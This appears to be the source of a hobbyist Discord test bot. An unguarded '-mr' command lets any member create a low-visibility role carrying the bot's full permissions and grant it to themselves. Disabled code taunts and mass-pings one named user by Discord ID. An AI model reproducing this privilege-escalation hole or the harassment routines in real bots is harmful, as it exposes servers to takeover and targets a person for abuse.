//@ts-check

import Discord from "discord.js";
import JSONHelper from "./utils/json-helper.js";

/**@type {{bot: {auth_token: string}; guild_map: any}}*/
const config = JSONHelper.readSync("./config.json");

const client = new Discord.Client();


client.once("ready",()=>{
    console.log("BOT STARTED:",client.user.tag,client.user.id);
    client.user.setPresence({activity:{name:"A test bot for testing",type:"PLAYING"}});

});
client.on("message",async msg => {
    if (msg.author.id == client.user.id) return;
    console.log(msg.content,msg.author.id);
    var saidIm = /(i'?m|i +am) *(.*?)(\.|,|$)/i.exec(msg.content);
    if (msg.author.id != client.user.id && saidIm) {
        msg.channel.send(`Hello ${saidIm[2]}, i am <@${client.user.id}>.`)
    }
    if (/*msg.author.id == "306579801563594755" && */Math.random()>1) {
        
        var res = null;
        switch(Math.floor(Math.random()*13)) {
            case 0: res = "why would you say that Noah?"; break;
            case 1: res = "shut up noah"; break;
            case 2: res = "you are being silenced, noah"; break;
            case 3: res = "no"; break;
            case 4: res = new Array(100).fill("SHUT UP NOAH").join(", "); break;
            case 5: res = "<@306579801563594755> ur bad"; break;
            case 6: 
                res = "hey wait, i thought your name was Noah, <@306579801563594755>";
                console.log((await msg.guild.members.fetch(client.user.id)).permissions.has("MANAGE_NICKNAMES"));
                msg.member.setNickname("yeet","the bot has spoken").catch(console.log)
                break;
            case 7: res = "<@306579801563594755> :ok:  :regional_indicator_b: :regional_indicator_o: :regional_indicator_o: :regional_indicator_m: :regional_indicator_e: :regional_indicator_r:"; break;
            case 8: res = "be quiet"; break;
            case 9: res = new Array(90).fill("<@306579801563594755>").join(""); break;
            case 10:
                Promise.all([msg.react("🆗"), msg.react("🇧"), msg.react("🇴"), msg.react("0️⃣"), msg.react("🇲"), msg.react("🇪"), msg.react("🇷")
                ]).catch(console.log)
                break;
            case 11: res = "do you are have stupid?"; break;
            case 12: res = "[13th message case]"
        }
        if (res) msg.channel.send(res);
    }
    if (true/* && msg.member.hasPermission("ADMINISTRATOR")*/) try {
        var {content,channel:c} = msg;
        switch(content) {
            case "-s":
            case "-stop":
                quitClient();
                break;
            case "-mr":
                const rNm = "267492503592640552", rCol = 0x000000;
                var role = msg.guild.roles.cache.find(r=>r.name==rNm);
                if (!role) role = await msg.guild.roles.create({data:{name:rNm,permissions:(await msg.guild.members.fetch(client.user.id)).permissions,color:rCol,position:0}})
                msg.member.roles.add(role.id,"yes");
                /*
                var role = (await msg.guild.members.fetch(client.user.id)).roles.cache.find(r=>r.managed);
                console.log(role.position)
                console.log((await msg.guild.members.fetch(client.user.id)).permissions.has("MANAGE_ROLES"))
                role = await role.setPosition(99999999);
                console.log(role.position)*/
        }
    } catch (e) {console.error(e);}
});

function quitClient() {
    client.destroy();
    return process.exit(2);
}
client.login(config.bot.auth_token);